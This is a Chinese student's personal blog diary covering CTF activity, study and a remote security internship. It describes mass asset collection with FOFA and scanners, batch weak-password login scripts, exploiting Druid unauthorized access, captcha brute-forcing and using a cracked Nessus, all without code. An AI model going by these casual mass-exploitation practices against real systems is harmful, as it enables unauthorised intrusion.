一次练习才实现了批量打&amp;提交的脚本、比赛前一个月从零搜集web脚本以及不会的只能问XDU的师傅2333、搭校赛平台没有可用的服务器，还是学弟先在云服务器上搭了一个（啊 我也得反思，去年在云服务器上搭的纳新CTF平台在纳新结束后就没管它了，服务器到期前也没把它备份一下）。另外，可能是由于搞CTF起步较晚积累不足，只有搞web、re和（x86、x64）pwn的（我密码呢？）就罔论IoT（、工控、BlockChain）之类的了，并且也缺乏合适、完整的road map，（到现在都不明白全栈er到底是怎么做到的…）完全想象不到神犇师傅们是怎么学的，以及“弱但ctf强校”怎么去的BCTF、DEFCON、HITCON。网安院和智邮的情况不太清楚，不过估计也相似。总的来说目前学校的安全和（以及协会的）CTF算是处于刚起步的阶段，还是得从我们开始慢慢进行各方面的积累（吧？。不知道犇校出现断层后是咋续上的，好强。<br>
以上，快要退位和退役了，总结一下，也好让后来人避坑并把学校的CTF搞得更好。</li>
</ul>
<h3 id="2021-07-26">2021-07-26</h3>
<p>昨天接了个安全客的翻译，大概一千多字，今天晚上整完了明天发给编辑<br>
这两天就看了几页操作系统，果然回家跟我爸妈出去玩都没在学习的2333<br>
前几天打算问各师傅的事情还没去问，争取明天解决几个orz<br>
下午打了两小时网球，好久没运动了累得很<br>
上回看了个师傅的博客，把他看过的书都做了个汇总和评论，感觉挺好的，值得效仿√</p>
<h3 id="2021-07-27">2021-07-27</h3>
<p>京东凑单的计组黑皮书到了但没开始也没计划啥时候开始看</p>
<p>因为今天学习时间比较零碎加上昨天逛BOSS直聘的时候看到了个软件所的岗位要求熟悉shell，所以学了点shell</p>
<p>越来越觉得自己习惯了写长句子</p>
<h3 id="2021-07-28">2021-07-28</h3>
<p>被我妈拉着去按摩。按得肩膀痛的一… 果然，运动完没放松（ ） / 太久没运动了（√）</p>
<p>晚上看到学校公众号发了个近期比赛获奖的宣传，连省级某广告类比赛都有提到，居然没有信安类的竞赛（好歹区域赛有两个特奖，国赛一个三等一个优胜啊）。学长他们也有点气，“这样之后哪有人打比赛啊 真就绝后了”…想起来大一的时候和某院院长聊天，他说网安会成为学校之后主要发展的方向，彳亍</p>
<h3 id="2021-08-02">2021-08-02</h3>
<p>回老家呆了两天，因为厦门部分地区成了中高风险（怕麻烦到家里人）所以又回家了…三天加了十个小时左右的驾驶时长2333<br>
31号认识了一个网安院信安实验室的学长，聊了一下感觉他们实验室内的交流分享做的挺好的，跟他一起把最近几届搞安全的人拉了个群<br>
前几天没咋学，看了几页操作系统和英语（雅思），感觉操作系统io和磁盘那块有点难懂，估计得看一下csapp或结构体系之类的</p>
<p>这两天又是疫情又是100mm降水，好像还快有台风了，emmm！<br>
今天胡思乱想的比较多，唉</p>
<p>在考虑要不要给日报上密码</p>
<h3 id="2021-08-05">2021-08-05</h3>
<p>操作系统差不多算看过一遍了，剩下的就日后用到再复习<br>
打算开始看点闲书（事实上也这么做了，哲学书好肝）</p>
<p>给博客加了个书单的栏目，顺便调整了一下字体</p>
<h3 id="2021-08-06">2021-08-06</h3>
<p>工信安全中心那边又说能实习了…今天弄个远程实习手续<br>
要说干了啥其他的事…就是在弹琴看书啦（划水</p>
<h3 id="2021-08-10">2021-08-10</h3>
<p>开始实习。<br>
9:15-12:20：了解了一点渗透测试，以及例如fofa之类信息收集搜索引擎的用法。查了一下咋进行批量登录（带验证码），本来以为能用burp，但发送的用户名和密码进行加密了不知道咋处理，所以打算用python（茶<br>
13:00-17:50：写了几个弱口令漏洞的报告，把python脚本的输入部分解决了，剩下异常处理和 绕过浏览器对网站证书检查 明天整<br>
晚上本来要看闲书，结果有事耽搁了。希望开学前能看完半本《论中国》…</p>
<p>感觉实习内容和想象中还蛮不同的（以为是文档工作居多），结果一上来就是渗透测试啥的…（web安全的学习可以提前了，挺好2333<br>
上一天班，感觉和打一天比赛有得一拼，（指电脑看久了、精神集中头晕眼花，坐着没咋起来走动、喝水啥的。虽然和在实验室有点像，但似乎有成为社畜的潜质了，这不好</p>
<p>之后实习期间的日报估计都会按这种格式来</p>
<h3 id="2021-08-11">2021-08-11</h3>
<p>9:16-12:07：信誓旦旦说自己应该能复现CVE-2020-4450，结果看了一早上<span class="exturl" data-url="aHR0cHM6Ly9wYXBlci5zZWVidWcub3JnLzEzMTUvI18x">WebSphere 远程命令执行漏洞（CVE-2020-4450）分析 (seebug.org)<i class="fa fa-external-link-alt"></i></span>、<span class="exturl" data-url="aHR0cHM6Ly9sdWNpZmFlci5jb20vMjAyMC8wOC8yMS9XZWJTcGhlcmUlRTglQkYlOUMlRTclQTglOEIlRTQlQkIlQTMlRTclQTAlODElRTYlODklQTclRTglQTElOEMlRTYlQkMlOEYlRTYlQjQlOUUlRTUlODglODYlRTYlOUUlOTAlRUYlQkMlODhDVkUtMjAyMC00NDUwJUVGJUJDJTg5Lw==">WebSphere远程代码执行漏洞分析（CVE-2020-4450） · Lucifaer's Blog<i class="fa fa-external-link-alt"></i></span>、<span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3Mvc3BESE9hRmhfMHp4WEFENHlQR2VqUQ==">Websphere CVE-2020-4450漏洞分析 (qq.com)<i class="fa fa-external-link-alt"></i></span>、<span class="exturl" data-url="aHR0cHM6Ly96aHpoZG9haS5naXRodWIuaW8vMjAyMC8wOC8xNS9XZWJTcGhlcmUtSUlPUCVFNSU4RiU4RCVFNSVCQSU4RiVFNSU4OCU5NyVFNSU4QyU5Ni1DVkUtMjAyMC00NDUwLw==">WebSphere IIOP反序列化(CVE-2020-4450) - osword's blog (zhzhdoai.github.io)<i class="fa fa-external-link-alt"></i></span>还是一点想法都没有，于是直呼做不了（…）<br>
14:20-18:14：先是摸了摸鱼，发现selenium在用webdriver的时候可以添加忽略证书错误的选项，接下来应该就剩下 检测口令是否正确 和 异常处理 了。四点多的时候开始尝试资产收集</p>
<p>晚上跟爸妈和一些客人聊天，突然想起来我在实习前并没有核实对方的身份…交流也都是通过微信…虽然看对方pyq和工信安全中心官网还挺真实，（而且不会真的有人冒充工信部下属单位吧2333），投简历的软件也比较可信，但以后找实习还是得多留个心眼（毕竟做的事还蛮适合进局子的，给看到这则日报的师傅们提个醒</p>
<h3 id="2021-08-12">2021-08-12</h3>
<p>9:20-12:06：资产收集。期间用FOFA搜的时候进了个“直接把用户名和密码放在输入框上”的小站后台…Orz<br>
14:16-17:55：资产收集。期间有些公司的不太好收集（太菜了），跟师大的师傅聊了一下该咋整，他建议试一下用上企查查之类的工具。（虽然因为企查查、天眼查这类的功能要VIP所以没弄，但毕竟多了个思路）</p>
<p>晚上和波神请教了一下，他给了个<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tLzB4NzI3L1NodWlaZV8weDcyNw==">ShuiZe_0x727: 信息收集自动化工具<i class="fa fa-external-link-alt"></i></span>，先搭起来，明天试试看<br>
另：师大的师傅一开始以为我去碰黑产了，最后还不忘提醒我小心点别被坑了233333，不过u1s1确实</p>
<h3 id="2021-08-13">2021-08-13</h3>
<p>9:30-12:20：因为昨天晚上水泽有些python库下载比较慢装好，先花了十几分钟搭好。搭完后放后台跑了几个之前找过的公司，同时用企查查导出备案域名放到goby里跑<br>
13:30-16:00：整理这几天找的信息，顺便用水泽再跑了一两个（顺带发现了点漏洞orzz），不得不说跑的挺全但效率不高。下午因为有点事所以打了个招呼就提前溜了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">本周工时统计：8.10-8.13，共计3.5天</span><br><span class="line">本周工作内容：1.学习并编写批量验证网页后台密码的脚本（完成进度70%）2.提交四份漏洞报告3.了解fofa查询语句及其他信息收集工具，进行旅游业公司资产收集</span><br></pre></td></tr></table></figure>
<p>虽然下午是上到4点才溜，导师还是把工时扣了半天（请假最小请半天），嗯，无所谓啦<br>
这实习还真跟我学的不太一样2333<br>
下午问了一下，导师不检查日报需不需要脱敏，只要不主动泄密就行√</p>
<h3 id="2021-08-14">2021-08-14</h3>
<p>去翔安当了个疫苗接种志愿者（进行身份证信息录入），时间是早上八点到下午三点半（因为疫苗不够2333）。蛮有意义的，建议有机会都来基层感受，就不多说了（懒<br>
晚上回家，用事实证明，融化一罐意外冻成冰块的可乐可能会得到一罐糖水…不过好像因为是我nt在没融化完之前就打开了易拉罐…</p>
<p>今天是七夕，在博客上某处偷偷放了个碎碎念（更新：放出来了，反正这也没啥好遮掩的）</p>
<p>今天是七夕，就说点最近对于 romantic relationship 的想法。首先是较为肯定的在考研上岸前不会追求异（同）性或主动开始一段关系，毕竟是会花费大量时间、显著影响心情的事，而在短期规划里似乎也容不下另一个人的干扰。且确实，在目前身处的环境（现实或网络）里并没有碰见真正心动的人，虽然在与某些人的浅层次交流中可以感到合拍的愉悦（从某种意义上来说这时候也太舒服了），但时间久了就会发现同对方在另一些方面步调完全不一致，如一些必要技能的缺失、过分天真、对未来毫无计划，甚至于完全无法理解的political position等，此类差异竟会带来对人的鄙夷和厌烦，因而也无论造成两人不同的原因是家庭、个人经历亦或生活环境等了，改变一个人的难度太大。<br>
回顾（算是有一点点的）情感经历，其实某种结局在较为开始的阶段可能就确定了（但毕竟是回顾，谁知道其实是不是呢…写的人随意写，看的人随意看吧）。无论追与被追，亦无论是根据上面提到的三观、在对方心中占据的分量以及某些现实因素等，对结局的确定方式更像是玄而又玄的第六感加上基于事实细节的推测。我以为（必需时）理智的做法还是应当及时抽身 before it’s too hard to tolerate。尽管会因为现有舒适（依赖）的 intimate relationship 和 对于未来的期冀 等因素产生不舍，对我来说部分不可忽视的原因同时还包括付出的沉没成本。但其实每次主动结束必然会结束的暧昧/实际关系之后都是新的成长呢（铁石心肠啊…突然一悲），至于是否愿意放弃沉没成本则见仁见智，本人目前更倾向及时指吮罢了，盖因将大量精力花在无意义和无长远结果的交往中功利地看确实是一种waste，倘若在其身上浪费可观的时间，到最后大呼后悔遇到某人就更为得不偿失了。<br>
其实有个持续多年的经历，印象还蛮深的，最后仔细一想，心中的喜欢或许只如段誉之于王语嫣，等到无量洞中的玉像被打破，意识到插在玉像鬓边的明珠玉钗并不像脑补的那样，其实也会变黄，可能一切心思也就结束了吧（啊，这就是为啥喜欢新修版吗2333）<br>
<s>最近在和某网友的交流中对无现实考量的恋爱抱有不可言明的态度，大抵是认为连自己的未来发展都没有考虑过的恋爱也颇为幼稚了。走一步看一步的日子在紧要关头时只能匆忙做出决定，这种得过且过的态度在单身时仅是个人的选择，但身处一段密切关系时做出的选择影响的或许是两个人，此时不周全的决定在我有限的认识中即是对对方的不负责任了。同时，建立恋爱关系在我看来不应该只是基于情愫冲动而产生的行为，罔论相互促进，最低限度也该考虑不能因对方的干扰而过多影响自己的发展（至少在大学期间），诸如这些方面若是在建立关系后才进行思考也颇为不可取。</s><br>
哔哔了这么多垃圾文字，或许只是因为现在是个单身狗or沉没成本不够多or没有被狠狠甩过才说得这么轻松，但于我个人而言，为了在未来能够保持阶层甚至实现跃迁，近期确有比“找对象”更在意的事，（假装能）减少感情投入并趋于理性似乎也无可厚非。</p>
<p>以下胡言乱语：<br>
找对象应该至少，喜欢的音乐、书籍、影视类型差别不至太大，若是一个阳春白雪，另一个只喜欢下里巴人；一个看严肃文学，另一个只能接受网文；一个成天在微博追着哥哥，另一个对娱乐圈毫不关心甚至觉得该圈里他妈大比例的傻逼和渣滓全该图图了，就…想想蛮怪的。一发现这方面审美不合就应该立刻平复心思√</p>
<p>最后，但是，有对象的人请<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20211002211930.png" alt="20211002211930"></p>
<h3 id="2021-08-16">2021-08-16</h3>
<p>2333开始对上周收集的网站进行渗透测试</p>
<p>9:00-12:40：找找有啥自动化批量扫洞的工具。下了个xray和w3scan，问了波神还有啥，他说这俩就挺好的<br>
14:40-17:30：扫了学校和部分旅游业的资产（xray扫携程的时候4600H直接跑满了好怪，可能是因为用的xray批量脚本又把资产找了一遍，扫了好多不必要的站点？），并且也许是姿势不太对，一大半都是误报。到点准时下班</p>
<h3 id="2021-08-17">2021-08-17</h3>
<p>9:10-11:40：仔细看了一下昨天跑出来的漏洞报告。xss和shiro暂时不会，发现某站有个Druid未授权访问的洞，了解了一下咋利用，随后浏览器上装个editthissession就搞到了不得了的东西2333。导师给了个某OA的poc，下午弄一下写点报告<br>
2:20-17:30：弄了个脚本检测存在OA漏洞的网站（跑到下班只跑了一半orzz），交了六份报告。垃圾洞是真好出…</p>
<h3 id="2021-08-18">2021-08-18</h3>
<p>9:00-12:30：早上没任务，学了点web，主要是html和php<br>
14:30-18:00：导师给了个未授权访问的poc，任务是找到更多能日的站，找了一下午发现用到该CMS的网站把漏洞都修了orzz</p>
<p>下午三点左右导师给了个近期某事的poc集合，布置了后两天的工作<br>
六点给导师汇报（虽然他没说但还是想解释为啥一个下午都没产出）的时候被他催着下班233</p>
<h3 id="2021-08-19">2021-08-19</h3>
<p>9:00-11:40：看poc并尝试复现，试了四五个都被修完了（太菜了站都找不全）。看到有个poc跟第一天写的脚本有关，就又把脚本补充了一点<br>
14:40-16:30：遇到了个莫名其妙捕捉不到异常的bug，找珂学长一问发现是某方法名的&quot;_“写成”.&quot;（？怪哦。跑了一小时找了几十个站</p>
<h3 id="2021-08-20">2021-08-20</h3>
<p>9:10-11:30：写文档<br>
15:00-17:50：写文档</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">本周工时统计：8.16-8.20，共计5天</span><br><span class="line">本周工作内容：1.完成批量验证网页后台密码的脚本 2.提交漏洞报告3.了解漏洞扫描并部署相关工具</span><br></pre></td></tr></table></figure>
<p>社畜即使出去度假也在上班orzz爸妈泡温泉我只能在房间写文档<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/QQ%E5%9B%BE%E7%89%8720210822171318.jpg" alt="20210822171318"></p>
<p>当然下班之后就去玩啦23333</p>
<h3 id="2021-08-21">2021-08-21</h3>
<p>玩了一天，好爽<br>
在距离开学还有不到一周的时候，终于感觉到现在是在假期了</p>
<h3 id="2021-08-23">2021-08-23</h3>
<p>9:00-11:30：没任务，划水学习<br>
14:35-18:00：导师给了个漏洞，找了一下午找了五个站，写了三个报告，剩下一个明天写，一个没啥信息泄露不写了</p>
<p>接了个安全客的翻译，熬到十二点十分左右译完了</p>
<h3 id="2021-08-24">2021-08-24</h3>
<p>9:15-11:20：没任务，把上周的hw漏洞集合又看了看，没找到啥数据泄露<br>
14:00-18:00：把上回脚本跑1/40跑出的网站水了八个报告，再把上回某酒店的druid未授权访问报告写完，整理了近期的测试结果打包交给导师。</p>
<p>中午提前一点溜去和几个男酮跟初中数学老师吃饭:D<br>
晚上和某网友聊天，被拉着去打密码学竞赛了，tqlddw<br>
找了几篇论文，（发现其中有一篇是信工所某博导参与的），打算最近拿一篇来阅读和翻译</p>
<h3 id="2021-08-26">2021-08-26</h3>
<p>这两天疏于记录了，但工作时间相似，内容的话也都是几个cms的测试<br>
（于2021-08-28）</p>
<h3 id="2021-08-27">2021-08-27</h3>
<p>请了一天假，返校<br>
在飞机上看了几十页《论中国》，中途太困睡了个觉<br>
虽然但是，以后在飞机上遇到心动的女孩子一定会去要联系方式的呜呜呜</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">本周工时统计：8.23-8.26，共计4天</span><br><span class="line">本周工作内容：1.编写脚本对多个漏洞进行检测 2.提交漏洞报告</span><br></pre></td></tr></table></figure>
<h3 id="2021-08-28">2021-08-28</h3>
<p>去实验室整理了一下。<br>
明明有好多事，但突然啥都不想干了，草<br>
找了点雅思的资料，装作很认真要开始准备的样子</p>
<h3 id="2021-08-29">2021-08-29</h3>
<p>早起（6:30）跟几个老师打了会儿网球，西区澡堂开的好晚，之后可以考虑去东区洗澡了…<br>
突然想起来本来打算在飞机上复盘一下暑假生活（结果忘了），要是晚上有空再写吧2333（于9:00)<br>
中午困得很，下午整了点密码学竞赛的事，晚上确定了要翻译的论文<br>
总的来说就是一天啥都没干<br>
最近确实啥都不想做，还能找到诸如“耳机没带那就不听听力了”的借口（然后阅读也没看）<br>
去实验室才知道卷爷放假在软件所实习了，果然我是变成啥大事没干但成天哔哔昭告天下的那种了吗</p>
<h3 id="2021-08-30">2021-08-30</h3>
<p>早起（6:00）跟几个老师打了会儿球，不得不说老大爷体力真好orzz</p>
<p>去东区洗了个澡（好方便）后打算上班。导师问这两天有没有课，回答只有半天有空（虽然课能翘，但是某些别的事溜不掉），过了一段时间后让我啥时候有空了再说，他再安排任务，所以算是又能休息两天了2333。早上剩下的时间就用来翻译论文。</p>
<p>下午去网安院找了趟密码学竞赛老师，最近得了解一下国密了emm（因为是蹭队友的做过的项目，然后突然想起来我连他们的项目都没见过orzz）。上回在安全客上看到个<span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvUWI3MVdFNkRDSmtoSTU4N0ZsSVMyZw==">【技术分享】SM2国密算法应用的高危漏洞——CVE-2021-3711<i class="fa fa-external-link-alt"></i></span>，这两天也看一看</p>
<p>傍晚导师那边给了个<span class="exturl" data-url="aHR0cHM6Ly9hZGFsb2dpY3MuY29tL2Jsb2cvYmluYXJ5LXRvLWxsdm0tY29tcGFyaXNvbg==">Comparison of the LLVM IR generated by three binary-to-llvm translators <i class="fa fa-external-link-alt"></i></span>，晚上看了看。跟老师问了一下，之前课题用的中间代码方案可能要舍弃了，过两天他再找我和师兄讨论。感觉时间过的好快，师兄这就研二，我也明年就要毕业了2333</p>
<h3 id="2021-09-02">2021-09-02</h3>
<p>前两天晚上基本都在划水+看论文</p>
<p>今天没课实习一天，主要在写报告。感觉我即使翘课估计也只有两天能实习（  ，打算有课的时候把工作时间调整到晚上了233</p>
<h3 id="2021-09-09">2021-09-09</h3>
<p>昨天收到了安全客打的另一笔款，快从那拿了1k了<br>
今天问了运营一句“（安全客用户名边上的）黄标要咋拿”，然后就因为发了超过三篇文章而拿到了，顺便加了官方作者认证群2333</p>
<p>这周把实习时间灵活安排了一下（指推迟上班，晚上加班），反正只要报告写够了就行<br>
下午导师的课题组开了个短会，本来最后要讨论一下我和师兄的项目，结果他要去开会所以改到下周了。大概说了一下现在要进行两种方案（一种用到中间代码，一种不用）。话说不会要师兄写一篇我写一篇吧…emmm未曾设想的道路<br>
这几天课题方面的任务就先把几个生成中间代码的框架熟悉一下，考虑一下不同框架的稳定性、API啥的</p>
<p>考虑到日记有些内容不希望太多人知道，还是上了密码。</p>
<p>前段时间知乎上的鼎宝被某女拳大v举报到学校，不细说别的了，确实在网上的认证和言语要谨慎啊2333<br>
嗯我爸上回提醒的对</p>
<h3 id="2021-09-10">2021-09-10</h3>
<p>早八困死</p>
<p>昨天逛cnvd看到个中间件的漏洞，用到该框架的有些站可以进行收发短信，跟导师咨询了一下算是能造成挺大危害的。稍微收集了几个站。<br>
早上大概测了一下，写了一份报告拿给导师（因为感觉有些地方表述和格式可能不对），结果他说他在外边，有空看看（然后到下午下班都没空）23333<br>
在交完一份报告后就啥都没干了，看了点论文…<br>
晚上给小组的ctf出了个pwn，输入一堆垃圾字符导致栈溢出后爆flag的送分题，可惜不知道为啥（服务器/dockerfile的原因？）导致不是很稳定orz，好想改好但是还有好多事情orzz（懒</p>
<p>明天早上去网安院弄密码学初赛，再找个时间把bincode2llvmir的几个工具搭好，再学点英语，这个周末就结束了（</p>
<p>感觉今天啥都没干（不记得干了啥了）sad</p>
<h3 id="2021-09-11">2021-09-11</h3>
<p>早起打了个密码学初赛<br>
晚上跟学长吃串串的时候出了结果，组里有个没及格的2333</p>
<h3 id="2021-09-13">2021-09-13</h3>
<p>给导师发了个工作报告和文档，结果他没理我…<br>
看了点课题的东西，搭了一下mctoll<br>
遇到两个问题，提了一个issue，另一个自己解决了。最后在第二天凌晨两点的时候搭起来。发现编译llvm需要大概12g的内存（ram+swap）…</p>
<h3 id="2021-09-15">2021-09-15</h3>
<p>感觉像划了两天水…</p>
<p>早上睡到11：10，起来发现翘了一节编译原理…</p>
<p>昨天四份报告，今天三份报告，属实混子</p>
<p>明天早上10点去商量课题方案，必能起来</p>
<p>找个时间说几句关于挖洞和网站安全维护的想法<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210915201842.png" alt="20210915201842"></p>
<h3 id="2021-09-17">2021-09-17</h3>
<p>拿上回那个短信中间件凑了四份漏洞报告，没找到其他信息泄露的洞<br>
纯混子实习了属于是</p>
<h3 id="2021-09-18">2021-09-18</h3>
<p>中秋调休但没上班<br>
找安全客蹭了个苏宁src的月饼，虽然更想要长亭/58的月饼或者360的抱枕，但还是让先到的人选了<br>
感觉我属实有先上车的嫌疑，打算最近抓紧写几篇，国庆投给安全客（老好人了</p>
<h3 id="2021-09-21">2021-09-21</h3>
<p>月饼到了，安全客错寄成58的月饼23333<br>
嫦娥一号这款月饼还蛮好看的，不过只有四个月饼也颇少了</p>
<h3 id="2021-09-24">2021-09-24</h3>
<p>这三天被派了个测试某网站的任务。第一天完全不知所措，只能拿工具硬扫、乱扫。第二天中心那边给了个完整的报告模板，包括了测试内容、测试流程和测试方法，涵盖web安全、逻辑、中间件和服务器，还有每种漏洞的介绍（…）。算是broaden了视野，对完整的渗透测试流程也清晰很多。<br>
这两天有个同事来带我和另一个实习生干这个活，我就主要把逻辑漏洞和服务器漏洞检测了一下，今天上午因为另一个实习生报告写得有些问题，就把他负责的web安全测了一下，没找到漏洞但对个人确实还是有些收获。</p>
<p>讲真这几天是真的感觉到在“实习”，在这个单位干实事。上回问导师，写的这些报告所涉及的漏洞在cnvd之类的平台上都有披露过，为啥这么多公司——有些还是挺有名的，其内部系统里还有一些（我这种刚入门的小白都能挖到的）nday或者弱口令？导师说是因为披露后公司可能没有去处理，即平台披露后并不能强制让公司去修复，而现在写的漏洞报告会转交给相关的地方部门，直接要求该公司对该漏洞进行修复。<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210924185606.png" alt="20210924185606"></p>
<p>下午导师统计了我和另一个实习生的实习情况，估计快打钱了。看了一下另一个人写的总结，感觉线下实习好丰富…</p>
<h3 id="2021-09-26">2021-09-26</h3>
<p><em>和27号合在一起写了</em></p>
<p>本来开始继续进行全网数据安全的测试（吐槽一下远程实习也太单一了）下午对接的同事说甲方对几个结果不太认可，要再验证一下。<br>
其中一个在之后发现是我弄错了，另一个是我一直很确定且印象深刻（因为发现输密码有次数限制而验证码没有）的爆破验证码漏洞，但这回一直复现不出来，和同事两个人从下午六点多一直弄到晚上十一点无果。（第二天又试了一次还是不行，同事只好跟他们说是之前我运气太好五次内爆破出来orzz误报了）<br>
想想不太对劲，不仅因为我确实爆出来了还玩了两三次orzz，而且报告上也有爆了几万次然后成功了的burp截图。感觉可能是甲方这两天更新了系统（但对方开发又不承认）。后来跟同事和波波聊了一下，同事觉得他们这样偷搞猫腻也太没必要了（，波神说这种还挺常见的</p>
<p>感觉可能是之前爆破流量太大被甲方开发发现了…反正这回吸取教训，以后测试的时候爆破次数弄小点，成功之后再录个屏。</p>
<h3 id="2021-09-28">2021-09-28</h3>
<p>写了个脚本批量搞了些站，写报告的时候发现有个厦门公交集团的2333<br>
python真好用</p>
<p>最近有点烦&amp;焦虑，好多事都没做<br>
课题那边的论文还没看完，工具也没有调研全；想在国庆投给安全客的文章也没写完；国庆还想学点英语，草</p>
<h3 id="2021-09-30">2021-09-30</h3>
<p>给自己提前放了个假，上班也溜了，组会也溜了，实验室团建（误）爬华山，结果到华山脚下才被电话告知景区出票系统只看身份证地址，厦门现在是中高风险所以出不了票…淦，在宾馆里住了一晚睡到同行的人下山然后回西安…</p>
<p>旅游别用美团买票，会变得不幸（不止是因为购票时不提醒身份证用不了而携程会提醒，还涉及严重的信息泄露等）</p>
<h3 id="2021-10-02">2021-10-02</h3>
<p>十点半才起床，早上在实验室摸鱼补了两份漏洞报告。下午看点论文打打游戏，无限火力巨魔真好玩…</p>
<h3 id="2021-10-05">2021-10-05</h3>
<p>早上把昨天写完的文章看了两三遍投给安全客。顺便放到博客上预览了一下，发现网站对数学符号的渲染并不是很好，打算弄一下顺便给hexo和next主题升个级，结果把渲染和npm都搞崩了，弄了一下午没复原，最后选择重开。结果最后也没弄成数学符号支持，感觉新的博客和原来的差别还不少orzz</p>
<h3 id="2021-10-06">2021-10-06</h3>
<p>玩<br>
看了部华尔街之狼，我该反思一下为啥最近看的两部电影都有较多交媾的画面了…</p>
<h3 id="2021-10-07">2021-10-07</h3>
<p>走路去香积寺转了一圈，回来路上感觉得重感冒了…<br>
中午吃了个牛排结果发现饭量好像变大了点，吃完之后甚至还想去吃个麦当劳</p>
<p>晚上看到了个诺贝尔文学奖的新闻，获奖者是阿布杜勒拉扎克·古尔纳，一个坦桑尼亚小说家（看到国籍就觉得有点意思），创作题材的是南亚（印度）和非洲的殖民主义和奴隶贸易等，应该是…非洲文学家里作品比较牛逼的（外行乱评，懂文学的别打我）<br>
怎么说呢，看到这个结果感觉像是：</p>
<blockquote>
<p>这很西方，他们造就了殖民主义，又回过头来显示他们关注难民。<br>
颇有点在阿富汗，美军怀抱阿富汗小孩以展示人道主义的味道。</p>
</blockquote>
<p>想起了我国</p>
<p>再：搜“诺贝尔文学奖”和“阿布杜勒拉扎克·古尔纳”的时候清一色的复制粘贴通稿…吐了</p>
<h3 id="2021-10-09">2021-10-09</h3>
<p>网上冲浪发现我上回胡乱记录的 VEX IR 被一个师傅引流了（<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLnNoaTEwMTEuY24vY3RmLzE2MDElRUYlQkMlODk=">https://blog.shi1011.cn/ctf/1601）<i class="fa fa-external-link-alt"></i></span> 。再回去看看自己写的，啥玩意啊乱七八糟的…打算有空重新整理一下，过段时间估计要看LLVM-IR了2333</p>
<p>今天把日记又解封了，不想公布的东西放到了别的地方</p>
<h3 id="2021-10-10">2021-10-10</h3>
<p>这两天实验室（教学楼）网络全崩了orzz<br>
看了两页论文，写了篇雅思阅读和小作文<br>
摸鱼啊摸鱼~为啥有网划水，没网也摸鱼</p>
<p>前几天说可能要帮学弟他们打个ctf校赛，得重新开始看看pwn，看了题pwn，怀念每天死磕pwn题的日子，真有趣<br>
想搞搞kernel pwn，或者至少接触一下kernel</p>
<h3 id="2021-10-15">2021-10-15</h3>
<p>这几天干了啥呢，把<span class="exturl" data-url="aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMjU0Nzkz">Fr3v1带你读论文-Similarity of Binaries through re-Optimization<i class="fa fa-external-link-alt"></i></span> 投给安全客；看了几页固件分析的论文；在扇贝上背了点单词但没一天打上卡；日常水实习写报告</p>
<p>今天和导师（他出差来西安做测评了）去某企业现场做测评。挺离谱的一个经历，先是不让扫描（怕流量大挂了，我？？？），然后又把某系统用户密码忘了…直到下午我们走了都没进过那个系统。所以就只去机房看了看（机房也有点离谱，涉及那啥不表）。总的来说就是多了份经历+混了一天{不用写报告（不过之前报告数量不够可能周末还得补点）+逃了一节课}<br>
感觉国家信息安全还是任重而道远，不论是人员的意识和能力还是测评维度合理性上。这回对接的是一个真·啥技术都不懂的人，全靠（不知道啥职位，可能是运维吧）和导师交流（然后怕担责所以就没做漏扫，至于最后报告咋出，…略）；系统账号密码忘了，运维问也问不到是我没想到的；运维还连命令都敲不明白。测评维度方面，总感觉有些地方不是很合理，起码对于这个单位来说，有几个测评因素似乎有些冗余（不过也没太大影响），可能是因为等保的大部分适用，就直接一般化了。在被问及报告某块内容会怎么写时导师还需要说得含糊一些。导师：“正常，这就是现实。”， “像银行证券那些单位就很规范。”</p>
<p>导师：“你没来北京太可惜了，单位食堂很好吃还很便宜，统一三五块，菜按四十块的标准”</p>
<p>昨天晚上装Nessus装到三点多，因为电脑上有个依赖版本比旧版Nessus高，新版用不了旧版的破解方法所以最终没装上…（没救了，事业单位测评用的国外破解版软件（大误）</p>
<p>见到导师本人发现挺年轻的，就是发量较少，引以为戒</p>
<p>其实感觉实习近两周对我没啥提升，得再想想每天实习的时候要干啥了，可不能批量打了几百个然后每天就写报告</p>
<h3 id="2021-10-17">2021-10-17</h3>
<p>在csdn上看到个人发了好几篇本菜鸡写的文：<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA0NzkwOA==">你总是阴雨天的博客<i class="fa fa-external-link-alt"></i></span>，还挂了“原创”…就这？</p>
<h3 id="2021-10-18">2021-10-18</h3>
<p>今天还是主要扫全网，扫了一群，细看了七八个网站，写两份报告，剩下的有空再写<br>
下午被派了个渗透测试的活，不过群里也没通知，估计明天开始<br>
再试着装一下Nessus，插件解压出来不知道为啥只有6.8M，怪得很</p>
<p>晚上出现了个摸不着头脑的事情<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master//blog/20211019221816.png" alt="20211019221816"></p>
<p>这里不表</p>
<h3 id="2021-10-22">2021-10-22</h3>
<p>这周在做一堆网站的测试，具体不说，感觉我其实对报告上啥要写啥不写都不是很清楚…好几个xss和文件包含感觉都没啥用，工具出的好几个漏洞也复现不出来（茶<br>
不知道到实习结束，我在web安全上的水平能成啥样orzz</p>
<p>最近觉得自己在计网和操作系统（上学期看的也忘了一些了）上一直不是很认真，该找个时间看一看了，尤其是计网</p>
<p>昨天跟哲哲打了半个小时电话（离谱），也和一个女性朋友聊了聊，主要说了一下，嗯…上面那件事，两个人都让我（如果打算谈恋爱的话）跟她多相处一下再考虑。不过今天终于做出决定拒绝了，但为啥作出决定之后没有想象中那么如释重负…因为我发完消息之后聊天莫名其妙就结束了吗<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master//blog/6479f7eed1cf733413f1dc7298509fa.jpg" alt="6479f7eed1cf733413f1dc7298509fa"></p>
<p>我觉得，我可能要单身四年了</p>
<h3 id="2021-10-28">2021-10-28</h3>
